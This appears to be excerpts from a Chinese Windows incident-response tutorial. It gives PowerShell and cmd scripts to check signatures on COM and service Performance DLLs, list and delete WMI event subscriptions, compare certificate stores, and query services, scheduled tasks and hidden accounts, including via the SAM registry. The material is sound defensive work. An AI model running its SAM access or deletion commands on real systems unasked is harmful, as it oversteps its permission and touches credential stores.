                                (Join-Path -Path $env:SystemRoot -ChildPath "System32\$dllFileName")
                            )
                            foreach ($path in $searchPaths) {
                                if (Test-Path $path) {
                                    $found = $true
                                    $result = Verify-FileSignature -FilePath $path
                                    if ($result -eq "Invalid") {
                                        $invalidSignatures += @{
                                            RegistryPath = $subkey
                                            BinaryFilePath = $path
                                        }
                                        Write-Host "Signature is invalid for file: $path" -ForegroundColor Red
                                    } elseif ($result -eq "Valid") {
                                        Write-Host "Signature is valid for file: $path " -ForegroundColor Green
                                    }
                                    break
                                }
                            }
                            if (-not $found) {
                                Write-Host "Could not find file '$dllFileName' in default search paths. Skipping signature verification."  -ForegroundColor Yellow
                            }
                        }
                    } else {
                        Write-Host "Binary file path is empty for subkey $($subkey.PSChildName)."  -ForegroundColor Yellow
                    }
                }
            }
        }
    }

    # 打印不通过的签名验证信息
    if ($invalidSignatures.Count -gt 0) {
        Write-Output ""
        Write-Output ""
        Write-Output "--------------------------------------------------------"
        Write-Host "Invalid signatures:" -ForegroundColor Red
        foreach ($invalidSignature in $invalidSignatures) {
            $registryPath = $invalidSignature.RegistryPath
            $binaryFilePath = $invalidSignature.BinaryFilePath
            Write-Host "Registry path: $registryPath" -ForegroundColor Yellow
            Write-Host "Binary file path: $binaryFilePath" -ForegroundColor Yellow
            Write-Output ""
        }
        Write-Output "--------------------------------------------------------"
    }
}

# 要检查的注册表地址数组
$registryPaths = @(
    "Registry::HKEY_CURRENT_USER\Software\Classes\CLSID",
    "Registry::HKEY_CLASSES_ROOT\CLSID",
    "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\"
)

# 调用函数进行检查
Write-Host "Starting signature verification..."

Check-RegistryPaths -RegistryPaths $registryPaths

Write-Host "Signature verification completed."

```
 如果后期大家发现其他关于 COM 相关的注册表，也可以加入到 `$registryPaths` 数组中，例如 `HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID`

签名验证不通过并不代表这个程序是恶意的，可以先与开发人员确认，并且可以通过沙箱以及在线杀毒程序进行分析

【 Windows Server 2016 】默认情况

默认并不存在签名验证不通过的 `COM` 组件

### 2. 查询包含 <code>CommandLineEventConsumer</code> 类的命名空间

`$namespaces = Get-WmiObject -Namespace "root" -Class "__NAMESPACE"

foreach ($namespace in $namespaces) {
    $namespaceName = $namespace.Name
    $query = "SELECT * FROM meta_class WHERE __class = 'CommandLineEventConsumer'"
    $commandLineConsumerClass = Get-WmiObject -Namespace "root\$namespaceName" -Query $query

    if ($commandLineConsumerClass) {
        Write-Host "Namespace: $namespaceName"
    }
}

```
 包含 `CommandLineEventConsumer` 类的命名空间可以以执行命令的方式响应过滤器，如果存在非默认的命名空间，那就需要注意一下

我通过新建包含  `CommandLineEventConsumer` 类的命名空间测试事件订阅后门，但是无法详细了解  subscription  命名空间的情况，没有执行成功，但这并不意味着攻击者也不会成功，所以如果你发现了，检查一下总是好的

【 Windows Server 2016 】默认情况

 `subscription
DEFAULT

```

### 2. DLL 注入

DLL注入涉及的注册表项是`AppInit_DLLs`。它是一个注册表键值，`AppInit_DLLs` 注册表项的作用是指示操作系统在每个用户登录时加载指定的 DLL 文件

 `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows中 Appinit_Dlls 的值

```
 【 Windows Server 2016 】默认情况

`AppInit_DLLs`键的值是空的

### 2) Get-EventLog

查询登录成功的日志

 `Get-EventLog -LogName Security -InstanceId 4624

```
 如果想查询实际内容，与上面内容一样

### 2. nbtstat

用于显示与 NetBIOS 相关的网络连接和统计信息

 `nbtstat -c   // 列出远程[计算机]名称及其 IP 地址的 NBT 缓存

```

### 2) Performance

每个服务的注册表项都可以包含一个子项 `Performance` 用于监控服务的执行，部分 Windows 系统存在关于此项的 `1day`

 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Data\Performance

```

排查思路就是把服务的所有注册表项中包含  `Performance` 子项的，获取 `Library` 键的值，验证文件签名有效性以及签名发布者是否为微软

通过 `Powershell` 来完成

 `$microsoftCNS = @('Microsoft Corporation', 'Microsoft Windows', 'Microsoft Windows Hardware Compatibility Publisher', 'Microsoft Update', 'Microsoft Windows Publisher')

# 定义函数来进行签名校验
function Verify-FileSignature {
    param (
        [Parameter(Mandatory=$true)]
        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    if (Test-Path -Path $FilePath -PathType Leaf) {
        $signature = Get-AuthenticodeSignature -FilePath $FilePath

        if ($signature.Status -eq 'Valid') {
            $publisher = $signature.SignerCertificate.Subject

            # 解析发布者信息以提取 CN 字段的值
            $cnValues = @(($publisher -split ', ' | Where-Object { $_ -like 'CN=*' }).Substring(3))

            if ($cnValues.Count -eq 1) {
                $cnValue = $cnValues[0]
                # Write-Output "CN 字段的值: $cnValue"

                # 判断 CN 字段是否为微软官方
                if ($microsoftCNS -contains $cnValue) {
                    # Write-Output "CN 字段值为微软官方。"
                    return "Valid"
                }
            }
        }

        return "Invalid"

    }

    return "File Not Found"

}

# 定义函数来检查注册表地址
function Check-RegistryPaths {
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$RegistryPaths
    )

    $invalidSignatures = @()

    foreach ($registryPath in $RegistryPaths) {
        if (Test-Path -Path $registryPath) {
            $subkeys = Get-ChildItem -Path $registryPath
            foreach ($subkey in $subkeys) {
                $performancePath = Join-Path -Path $subkey.PSPath -ChildPath "Performance"
                if (Test-Path -Path $performancePath) {
                    $libraryValue = (Get-ItemProperty -Path $performancePath -Name "Library" -ErrorAction SilentlyContinue)."Library"
                    if ($libraryValue) {
                        $binaryFilePath = $libraryValue.Trim().Trim('"')
                        $binaryFilePath = [Environment]::ExpandEnvironmentVariables($binaryFilePath)
                        if (Test-Path $binaryFilePath) {
                            $result = Verify-FileSignature -FilePath $binaryFilePath
                            if ($result -eq "Invalid") {
                                $invalidSignatures += @{
                                    RegistryPath = $subkey
                                    BinaryFilePath = $binaryFilePath
                                }
                                Write-Host "Signature is invalid for file: $binaryFilePath" -ForegroundColor Red
                            } elseif ($result -eq "Valid") {
                                Write-Host "Signature is valid for file: $binaryFilePath " -ForegroundColor Green
                            }
                        } else {
                            $dllFileName = Split-Path -Leaf $binaryFilePath
                            $found = $false
                            $searchPaths = @(
                                (Join-Path -Path $env:SystemRoot -ChildPath $dllFileName),
                                (Join-Path -Path $env:SystemRoot -ChildPath "System32\$dllFileName")
                            )
                            foreach ($path in $searchPaths) {
                                if (Test-Path $path) {
                                    $found = $true
                                    $result = Verify-FileSignature -FilePath $path
                                    if ($result -eq "Invalid") {
                                        $invalidSignatures += @{
                                            RegistryPath = $subkey
                                            BinaryFilePath = $path
                                        }
                                        Write-Host "Signature is invalid for file: $path" -ForegroundColor Red
                                    } elseif ($result -eq "Valid") {
                                        Write-Host "Signature is valid for file: $path " -ForegroundColor Green
                                    }
                                    break
                                }
                            }
                            if (-not $found) {
                                Write-Host "Could not find file '$dllFileName' in default search paths. Skipping signature verification."  -ForegroundColor Yellow
                            }
                        }
                    } else {
                        Write-Host "Binary file path is empty for subkey $($subkey.PSChildName)."  -ForegroundColor Yellow
                    }
                }
            }
        }
    }

    # 打印不通过的签名验证信息
    if ($invalidSignatures.Count -gt 0) {
        Write-Output ""
        Write-Output ""
        Write-Output "--------------------------------------------------------"
        Write-Host "Invalid signatures:" -ForegroundColor Red
        foreach ($invalidSignature in $invalidSignatures) {
            $registryPath = $invalidSignature.RegistryPath
            $binaryFilePath = $invalidSignature.BinaryFilePath
            Write-Host "Registry path: $registryPath" -ForegroundColor Yellow
            Write-Host "Binary file path: $binaryFilePath" -ForegroundColor Yellow
            Write-Output ""
        }
        Write-Output "--------------------------------------------------------"
    }
}

# 要检查的注册表地址数组
$registryPaths = @(
    "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\"
)

# 调用函数进行检查
Write-Host "Starting signature verification..."

Check-RegistryPaths -RegistryPaths $registryPaths

Write-Host "Signature verification completed."

```

如果检测发现存在系统默认不存在的可执行文件或者 `DLL` ，需要与开发人员确认，并通过沙箱或者杀毒软件进行排查

【 Windows Server 2016 】默认情况

### 2. Powershell

使用 Powershell 可以直接获取个人和本地计算机的证书并进行比较，完成比较需要四个脚本

`script1.ps1`

用于采集操作系统默认的证书信息，所以是放在一个与受害服务器相同的纯净的操作系统中执行的，目的就是获取到默认证书信息

 `# 导出本地计算机和当前用户证书存储区
$certStores = @("My", "Root", "CA", "Trust", "AuthRoot", "TrustedPublisher", "TrustedPeople")
$defaultCerts = @{}
$systemTempDir = "C:\Windows\Temp"
$defaultCertsDir = Join-Path -Path $systemTempDir -ChildPath "DefaultCertificates"

foreach ($store in $certStores) {
    $certs = @(
        Get-ChildItem -Path "Cert:\LocalMachine\$store"
        Get-ChildItem -Path "Cert:\CurrentUser\$store"
    )

    foreach ($cert in $certs) {
        $certDir = Join-Path -Path $defaultCertsDir -ChildPath $store

        # 确保目录存在
        if (-not (Test-Path -Path $certDir)) {
            New-Item -ItemType Directory -Path $certDir | Out-Null
        }

        $certPath = Join-Path -Path $certDir -ChildPath "$($cert.Thumbprint).cer"
        $cert | Export-Certificate -FilePath $certPath

        # 将指纹存储到哈希表中，便于后续对比
        $defaultCerts[$cert.Thumbprint] = @{
            Path = $certPath
            Subject = $cert.Subject
            Issuer = $cert.Issuer
            NotBefore = $cert.NotBefore
            NotAfter = $cert.NotAfter
        }
    }
}

# 将哈希表保存为JSON文件
$defaultCertsJsonPath = Join-Path -Path $defaultCertsDir -ChildPath "defaultCerts.json"
$defaultCerts | ConvertTo-Json | Set-Content -Path $defaultCertsJsonPath

Write-Output "默认证书和JSON文件已导出到: $defaultCertsJsonPath"

```

`defaultCerts.json` 就是默认证书的情况

`script2.ps1`

用于采集被检查服务器的证书信息

 `# 导出本地计算机和当前用户证书存储区
$certStores = @("My", "Root", "CA", "Trust", "AuthRoot", "TrustedPublisher", "TrustedPeople")
$currentCerts = @{}
$systemTempDir = "C:\Windows\Temp"
$currentCertsDir = Join-Path -Path $systemTempDir -ChildPath "CurrentCertificates"

foreach ($store in $certStores) {
    $certs = @(
        Get-ChildItem -Path "Cert:\LocalMachine\$store"
        Get-ChildItem -Path "Cert:\CurrentUser\$store"
    )

    foreach ($cert in $certs) {
        $certDir = Join-Path -Path $currentCertsDir -ChildPath $store

        # 确保目录存在
        if (-not (Test-Path -Path $certDir)) {
            New-Item -ItemType Directory -Path $certDir | Out-Null
        }

        $certPath = Join-Path -Path $certDir -ChildPath "$($cert.Thumbprint).cer"
        $cert | Export-Certificate -FilePath $certPath

        # 将指纹存储到哈希表中，便于后续对比
        $currentCerts[$cert.Thumbprint] = @{
            Path = $certPath
            Subject = $cert.Subject
            Issuer = $cert.Issuer
            NotBefore = $cert.NotBefore
            NotAfter = $cert.NotAfter
        }
    }
}

# 将哈希表保存为JSON文件
$currentCertsJsonPath = Join-Path -Path $currentCertsDir -ChildPath "currentCerts.json"
$currentCerts | ConvertTo-Json -Depth 10 | Set-Content -Path $currentCertsJsonPath

Write-Output "当前证书和JSON文件已导出到: $currentCertsJsonPath"

```

`currentCerts.json` 文件就是当前系统的证书情况

`script3.ps1`

该脚本是用来比较两个文件的

 `param (
    [string]$defaultCertsPath = ".\defaultCerts.json",
    [string]$currentCertsPath = ".\currentCerts.json"
)

# 读取JSON文件
$defaultCerts = Get-Content -Path $defaultCertsPath | ConvertFrom-Json
$currentCerts = Get-Content -Path $currentCertsPath | ConvertFrom-Json

$differencesFound = $false

# 比较当前证书是否在默认证书中
foreach ($thumbprint in $currentCerts.PSObject.Properties.Name) {
    if (-not $defaultCerts.PSObject.Properties.Name.Contains($thumbprint)) {
        Write-Output "-----------------------------------------------"
        Write-Output "新增的证书: $($currentCerts.$thumbprint.Path)"
        Write-Output "  主题: $($currentCerts.$thumbprint.Subject)"
        Write-Output "  颁发者: $($currentCerts.$thumbprint.Issuer)"
        Write-Output "  有效期: $($currentCerts.$thumbprint.NotBefore) - $($currentCerts.$thumbprint.NotAfter)"
        $differencesFound = $true
    }
}

# 检查默认证书是否被篡改
foreach ($thumbprint in $defaultCerts.PSObject.Properties.Name) {
    if ($currentCerts.PSObject.Properties.Name.Contains($thumbprint)) {
        if ($defaultCerts.$thumbprint.Subject -ne $currentCerts.$thumbprint.Subject -or
            $defaultCerts.$thumbprint.Issuer -ne $currentCerts.$thumbprint.Issuer -or
            $defaultCerts.$thumbprint.NotBefore -ne $currentCerts.$thumbprint.NotBefore -or
            $defaultCerts.$thumbprint.NotAfter -ne $currentCerts.$thumbprint.NotAfter) {
            Write-Output "被篡改的证书: $($currentCerts.$thumbprint.Path)"
            Write-Output "  原始主题: $($defaultCerts.$thumbprint.Subject)"
            Write-Output "  当前主题: $($currentCerts.$thumbprint.Subject)"
            Write-Output "  原始颁发者: $($defaultCerts.$thumbprint.Issuer)"
            Write-Output "  当前颁发者: $($currentCerts.$thumbprint.Issuer)"
            Write-Output "  原始有效期: $($defaultCerts.$thumbprint.NotBefore) - $($defaultCerts.$thumbprint.NotAfter)"
            Write-Output "  当前有效期: $($currentCerts.$thumbprint.NotBefore) - $($currentCerts.$thumbprint.NotAfter)"
            $differencesFound = $true
        }
    }
}

if (-not $differencesFound) {
    Write-Output "未发现恶意证书。"
}

```
 将 `defaultCerts.json` 、`currentCerts.json` 、`script3.ps1` 放在同级目录下，执行 `script3.ps1`

可以发现当前系统相对于纯净的系统，多了很多证书，接下来就要判断这些证书是否为恶意攻击者留下的

这并不简单，分两步走，一方面是在线校验这些证书是否签名有效，证书链完整

此时用到 `script4.ps1`

 `# 定义证书文件所在的目录路径
$certificateDirectory = '.\'

# 获取指定目录下的所有证书文件
$certFiles = @(
    Get-ChildItem -Path $certificateDirectory -Filter '*.cer'
    Get-ChildItem -Path $certificateDirectory -Filter '*.crt'
)

# 遍历每个证书文件
foreach ($file in $certFiles) {
    try {
        # 读取证书文件
        $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($file.FullName)

        # 初始化证书链
        $chain = New-Object System.Security.Cryptography.X509Certificates.X509Chain
        $chain.ChainPolicy.RevocationMode = [System.Security.Cryptography.X509Certificates.X509RevocationMode]::Online
        $chain.ChainPolicy.UrlRetrievalTimeout = [TimeSpan]::FromMinutes(1)
        $chain.ChainPolicy.VerificationFlags = [System.Security.Cryptography.X509Certificates.X509VerificationFlags]::NoFlag

        # 构建证书链并检查状态
        if (!$chain.Build($certificate)) {
            # 证书验证失败时输出证书的详细信息
            Write-Host "----------------------------------------------------------------------------"
            Write-Host "Validation failed for certificate: $($file.Name)"
            Write-Host "Subject: $($certificate.Subject)"
            Write-Host "Issuer: $($certificate.Issuer)"
            Write-Host "Not Before: $($certificate.NotBefore)"
            Write-Host "Not After: $($certificate.NotAfter)"
            Write-Host "Thumbprint: $($certificate.Thumbprint)"
            Write-Host "Serial Number: $($certificate.SerialNumber)"
            Write-Host ""
            # 输出错误信息，每个错误后面紧跟分号，最后一行不带分号
            foreach ($status in $chain.ChainStatus) {
                Write-Host "Error: $status.Status - $($status.StatusInformation)" -NoNewline
            }
        }
    }
    catch {
        Write-Host "Failed to process file '$($file.Name)': $_"
    }
}

```
 将上述证书复制一份到与`script4.ps1`同一级目录，并执行 `script4.ps1`

可以看到这里有两个证书是校验失败了的，对于校验失败的证书，我们需要严格对待，与运维相关人员做详细确认，是否为正常程序留下的证书

对于校验成功的证书，我们要进行第二部，找到证书使用者或者说被颁发者信息（`script3.ps1` 得到的结果中 CN 对应字符串），之后去威胁情报平台或者搜索引擎中查找相关信息

### 2) Powershell 历史

Powershell 有两种历史记录的方式

 - 内置会话记录
 - PSReadLine 历史记录

 参考

https://learn.microsoft.com/zh-cn/Powershell/module/microsoft.Powershell.core/about/about_history?view=Powershell-7.4

内置会话记录

和 `cmd` 的历史记录一样，也是关掉窗口就没了

 `Get-History

```

还有三个简写命令，主打一个越来越简

 `history
ghy
h

```

PSReadLine

PSReadLine 在 PowerShell 控制台中提供改进的命令行编辑体验。

https://learn.microsoft.com/zh-cn/Powershell/module/psreadline/about/about_psreadline?view=Powershell-7.4

PSReadLine 维护一个历史记录文件，其中包含从命令行输入的所有命令和数据。 历史记录文件是一个名为 `$($host.Name)_history.txt` 的文件。

在 Windows 系统上，历史记录文件存储在 `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine` 中

在非 Windows 系统上，历史记录文件存储在 `$env:XDG_DATA_HOME/Powershell/PSReadLine` 或 `$env:HOME/.local/share/Powershell/PSReadLine` 中。

Windows Server 2016 中默认为

 `C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

```

默认情况下并不记录时间，无法像 Linux 那样通过配置环境变量的方法让已经记录的命令显示时间

经过测试，重启后不会删除记录

默认情况下 `Powershell` 的日志中记录的信息不是很有帮助，这里就不展示了

### 2. Powershell

查询过滤器

 `Get-WmiObject -Namespace "root\subscription" -Query "SELECT * FROM __EventFilter"
Get-WmiObject -Namespace "root\DEFAULT" -Query "SELECT * FROM __EventFilter"

```

查询消费者

 `Get-WmiObject -Namespace "root\subscription" -Query "SELECT * FROM __EventConsumer"
Get-WmiObject -Namespace "root\DEFAULT" -Query "SELECT * FROM __EventConsumer"

```

查询绑定

 `Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding"
Get-WmiObject -Namespace "root\DEFAULT" -Query "SELECT * FROM __EventConsumer"

```

当然，我给大家准备了脚本一键查询

 `$namespaces = @("root\subscription", "root\DEFAULT")

foreach ($nameSpace in $namespaces) {
    $filterInstances = Get-WmiObject -Namespace "$nameSpace" -Query "SELECT * FROM __EventFilter"
    $consumerInstances = Get-WmiObject -Namespace "$nameSpace" -Query "SELECT * FROM __EventConsumer"
    $bindings = Get-WmiObject -Namespace "$nameSpace" -Class "__FilterToConsumerBinding"

    Write-Host "【 NameSpace: $nameSpace 】"
    Write-Host "-------------------------"
    Write-Host "Event Filters:"
    Write-Host "-----------------"
    foreach ($filter in $filterInstances) {
        $filterName = $filter.Name
        $filterQuery = $filter.Query
        Write-Host "Filter Name: $filterName"
        Write-Host "Query: $filterQuery"
        Write-Host ""
    }

    Write-Host "Event Consumers:"
    Write-Host "-----------------"
    foreach ($consumer in $consumerInstances) {
        $consumerName = $consumer.Name
        $consumerCommandLine = $consumer.CommandLineTemplate
        $consumerTemplate = $consumer.ExecutablePath
        Write-Host "Consumer Name: $consumerName"
        Write-Host "Command Line: $consumerCommandLine"
        Write-Host "Template: $consumerTemplate"
        Write-Host ""
    }

    Write-Host "Bindings:"
    Write-Host "-----------------"
    foreach ($binding in $bindings) {
        $filterPath = $binding.Filter
        $consumerPath = $binding.Consumer

        $filter = $filterInstances | Where-Object { $_.__RELPATH -eq $filterPath }
        $consumer = $consumerInstances | Where-Object { $_.__RELPATH -eq $consumerPath }

        if ($filter -and $consumer) {
            $filterName = $filter.Name
            $consumerName = $consumer.Name

            Write-Host "Binding: "
            Write-Host "Filter Name: $filterName"
            Write-Host "Consumer Name: $consumerName"
            Write-Host ""
        }
    }
}

```

【 Windows Server 2016 】默认情况

过滤器

消费者

绑定

脚本执行情况

### 2) Powershell

删除过滤器

 `Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" | Where-Object {$_.Name -eq "FilterName"} | ForEach-Object { $_.Delete() }

```

删除消费者

 `Get-WmiObject -Namespace "root\subscription" -Class "CommandLineEventConsumer" | Where-Object {$_.Name -eq "ConsumerName"} | ForEach-Object { $_.Delete() }

```

删除绑定

 `Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" | Where-Object {$_.Filter -eq "__EventFilter.Name='FilterName'"} | ForEach-Object { $_.Delete() }

```

### 2. SC 命令

`sc.exe` 是操作服务控制管理器的命令行程序，此处可以用来查询可疑服务的快捷操作，在cmd中输入：

 `sc                                          # 直接列出参数列表
sc queryex                          # 列出所有服务的扩展状态，包含可执行文件路径、可执行文件参数等
sc qc "ServiceName"         # 查询某项服务的配置信息

```
 `sc` 如果想查询完整的所有信息似乎没有一个现成的指令，可以使用下面的 `bat` 来操作，设置服务名称

如果输出的文件中文乱码，尝试将第二行的 `REM` 去掉

 `@echo off
REM chcp 65001 > nul
setlocal

set "serviceName=ServiceName"
set "outputFile=service_info.txt"

REM 查询基本信息
echo === 基本信息 === >> %outputFile%
sc queryex %serviceName% >> %outputFile%

REM 查询详细信息
echo === 服务配置 === >> %outputFile%
sc qc %serviceName% >> %outputFile%

REM 查询描述信息
echo === 描述 === >> %outputFile%
sc qdescription %serviceName% >> %outputFile%

REM 查询故障恢复配置
echo === 故障恢复 === >> %outputFile%
sc qfailure %serviceName% >> %outputFile%

REM 查询触发器信息
echo === 触发器信息 === >> %outputFile%
sc qtriggerinfo %serviceName% >> %outputFile%

REM 查询安全描述
echo === 安全描述 === >> %outputFile%
sc sdshow %serviceName% >> %outputFile%

REM 查询服务SID
echo === 服务SID === >> %outputFile%
sc showsid %serviceName% >> %outputFile%

REM 打开输出文件
start notepad %outputFile%

endlocal

```

### 2. schtasks 查看定时任务列表

在Windows中通常用`at`和`schtasks`命令添加计划任务，其中`at`命令默认是以System权限执行，但是从 Win8开始不再支持 `at` 命令，所以以下以`schtasks`命令来进行介绍

cmd中输入：

 `schtasks /？

```
 即可看到计划任务命令相关用法

 `schtasks /query     //查看当前所有计划任务列表

```

 `schtasks /query /fo LIST /v

```
 可以列出计划任务的信息，但是默认也会非常长，建议输出到文件中查看

`schtasks` 的 `query` 指令有三种输出格式， `TABLE、LIST、CSV`，如果希望以表格的形式查看，也可以尝试

 `schtasks /query /fo TABLE /v
schtasks /query /fo CSV /v

```
 经过测试，`table` 的效果不是很好，可以导出到文件中进行查看。`CSV` 格式还是不错的，可以导出成 `CSV` 文件

如果不希望每一大项都有一份标题，可以考虑保留一份标题，之后输出纯内容，当然，也可以直接在 `excel` 中去重等方式完成

 `schtasks /query /fo CSV /v > 1.csv
# 去掉内容，仅保留第一行
schtasks /query /fo CSV /v /NH >> 1.csv

```

如果想查看某一项的内容，可以使用路径+名称的方式

 `位置+名称则为
\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser

```
 如果想查找指定的计划任务，需要使用 `/TN`  参数，`schtasks` 命令对于空格处理允许整体使用双引号，也允许仅仅把空格用双引号引上

 `schtasks /query /fo LIST /v /TN \Microsoft\Windows\Application" "Experience\Microsoft" "Compatibility" "Appraiser

# 也可以使用双引号将整体引住
schtasks /query /fo LIST /v /TN "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser"

```

虽然我们只查询了这一条计划任务，但这里显示的结果不止一条，而是 3 条，这个条数是根据该条计划任务触发器的数量来决定的

触发器这里是三条，查询出来的内容就是三条

schtasks 是可以看到 Windows Api 创建的计划任务的

### 2. set 命令查询基本信息

cmd中输入：

 `set     //列出系统OS系统变量和用户环境变量

```

【 Windows Server 2016 】 默认情况

`Administrator` 用户

 `Name                           Value
----                           -----
ALLUSERSPROFILE                C:\ProgramData
APPDATA                        C:\Users\Administrator\AppData\Roaming
CommonProgramFiles             C:\Program Files\Common Files
CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files
CommonProgramW6432             C:\Program Files\Common Files
COMPUTERNAME                   WIN-2MTJ8IQ5VEA
ComSpec                        C:\Windows\system32\cmd.exe
HOMEDRIVE                      C:
HOMEPATH                       \Users\Administrator
LOCALAPPDATA                   C:\Users\Administrator\AppData\Local
LOGONSERVER                    \\WIN-2MTJ8IQ5VEA
NUMBER_OF_PROCESSORS           4
OS                             Windows_NT
Path                           C:\Program Files (x86)\Parallels\Parallels Tools\Applications;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\...
PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
PROCESSOR_ARCHITECTURE         AMD64
PROCESSOR_IDENTIFIER           Intel64 Family 6 Model 158 Stepping 13, GenuineIntel
PROCESSOR_LEVEL                6
PROCESSOR_REVISION             9e0d
ProgramData                    C:\ProgramData
ProgramFiles                   C:\Program Files
ProgramFiles(x86)              C:\Program Files (x86)
ProgramW6432                   C:\Program Files
PROMPT                         $P$G
PSModulePath                   C:\Users\Administrator\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC                         C:\Users\Public
SESSIONNAME                    Console
SystemDrive                    C:
SystemRoot                     C:\Windows
TEMP                           C:\Users\ADMINI~1\AppData\Local\Temp
TMP                            C:\Users\ADMINI~1\AppData\Local\Temp
USERDOMAIN                     WIN-2MTJ8IQ5VEA
USERDOMAIN_ROAMINGPROFILE      WIN-2MTJ8IQ5VEA
USERNAME                       Administrator
USERPROFILE                    C:\Users\Administrator
windir                         C:\Windows

```

### 2) Stop-Process

该命令为停止相关进程，通过`get-help stop-process`获取帮助

演示：

 `spps -id 8828                   //停止8828进程
spps -name “msedge”     //停止名字为msedge的进程

```

### 2. tasklist

cmd中输入：

 `tasklist /?

```
 常用命令解析：

 `tasklist                //直接列出进程列表

//“/m /v /svc“三个命令不能同时使用
tasklist /m         //进程使用了哪些模块、dll等
tasklist /m user32.dll      //哪些进程使用了该user32.dll
tasklist /svc       //显示每个进程中的服务信息
tasklist /v         //显示详细信息内容，包含会话、内存、用户等信息

tasklist /fi "USERNAME ne NT AUTHORITY\SYSTEM" /fi "STATUS eq running"
//“/fi”后面跟的是查询语句，列出系统中正在运行的非“SYSTEM“状态的所有进程，ne为不等于，eq为等于
常用

/fi 查询关键字
    STATUS          eq, ne                    RUNNING | SUSPENDED
                                              NOT RESPONDING | UNKNOWN
    IMAGENAME       eq, ne                    映像名称
    PID             eq, ne, gt, lt, ge, le    PID 值
    SESSION         eq, ne, gt, lt, ge, le    会话编号
    SESSIONNAME     eq, ne                    会话名称
    CPUTIME         eq, ne, gt, lt, ge, le    CPU 时间，格式为
                                              hh:mm:ss。
                                              hh - 小时，
                                              mm - 分钟，ss - 秒
    MEMUSAGE        eq, ne, gt, lt, ge, le    内存使用(以 KB 为单位)
    USERNAME        eq, ne                    用户名，格式为
                                              [域\]用户
    SERVICES        eq, ne                    服务名称
    WINDOWTITLE     eq, ne                    窗口标题
    模块         eq, ne                    DLL 名称
//运算符
相等(EQ)、不等(NE)、小于(LT)、大于(GT)、小于或等于(LE)、大于或等于(GE)

```

### 2. wmic查询补丁信息

cmd中输入：

 `wmic qfe list           //列出系统内补丁信息

```

### 2) 注册表查看隐藏账户

`regedit`为打开注册表编辑器快捷指令

`win + r` 中输入

 `regedit

```
 不同版本的操作系统位置不同

Windows 2016

`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\`

`HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`

SAM 目录需要赋予权限，应急结束时记得取消权限

也可以通过命令行命令查询注册表

 `reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\ProfileList\ /s
reg query HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names

```

也可以过滤一下

 `reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" "NT\CurrentVersion\ProfileList\ /s  | For /F "tokens=3" %i in ('findstr ProfileImagePath') do @echo %i

```

Tips：

 - Windows reg query 遇到空格的处理方法多少有些奇怪，整体用双引号引上不行，反斜线也不太行，得用双引号把空格引上
 - 如果一个用户只是被创建了而没有登录，在注册表中可能是看不到这一项的，因此做实验的朋友们记得登录一次

 【Windows Server 2016 】 默认情况

### 2) 系统临时目录

`C:\Windows\Temp

```

### 2. 垃圾桶目录

每个本地硬盘分区都有一个隐藏的系统文件夹用于存储该分区删除的文件。回收站的实际物理路径通常是：

 `C:\$Recycle.Bin

```
 如何进入该目录呢？

 `cd /d %SystemDrive%\$Recycle.Bin

```

### 2. 访问记录

### 2. 通过事件查看器

`eventvwr

```
 应用程序和服务日志 -> `Microsoft` -> `Windows` -> `Windows Defender` -> `Operational`

相关事件 ID

 事件ID 事件内容 1000 反恶意软件扫描启动 1001 反恶意软件扫描已完成 1002 反恶意软件扫描在完成之前已停止 1003 反恶意软件扫描已暂停 1005 反恶意软件扫描失败 1006 反恶意软件引擎发现恶意软件或其他可能不需要的软件 1007 反恶意软件平台执行了一项操作来保护系统免受恶意软件或其他可能不需要的软件的攻击 1008 反恶意软件平台尝试执行操作来保护系统免受恶意软件或其他可能不需要的软件的攻击，但操作失败 1009 反恶意软件平台从隔离区中还原了项 1011 反恶意软件平台从隔离区中删除了项目 1013 反恶意软件平台删除了恶意软件和其他可能不需要的软件的历史记录 1015 反恶意软件平台检测到可疑行为 1116 反恶意软件平台检测到恶意软件或其他可能不需要的软件。 1117 反恶意软件平台执行了一项操作来保护系统免受恶意软件或其他可能不需要的软件的攻击 更多事件ID以及含义查看以下官方链接

https://learn.microsoft.com/zh-cn/microsoft-365/security/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide

### 2. 防火墙允许的应用

允许应用或功能通过 `Windows` 防火墙

【 Windows Server 2016 】 默认情况

 名称 专用 公用 “播放到设备”功能 1 1 AllJoyn 路由器 1 0 Cortana (小娜) 1 1 DiagTrack 1 1 DIAL 协议服务器 1 0 mDNS 1 1 SmartScreen 筛选器 1 1 Windows Shell Experience 1 1 Windows 默认锁屏界面 1 1 Windows 远程管理 1 1 Xbox Game UI 1 1 电子邮件和帐户 1 1 工作或学校帐户 1 1 核心网络 1 1 你的帐户 1 1 网络发现 1 0 网络发现与系统最初设置有关

### 2. 任务管理器

任务管理器默认看不到 `SMB` 连接会话

### 2. 全局登录自启动目录

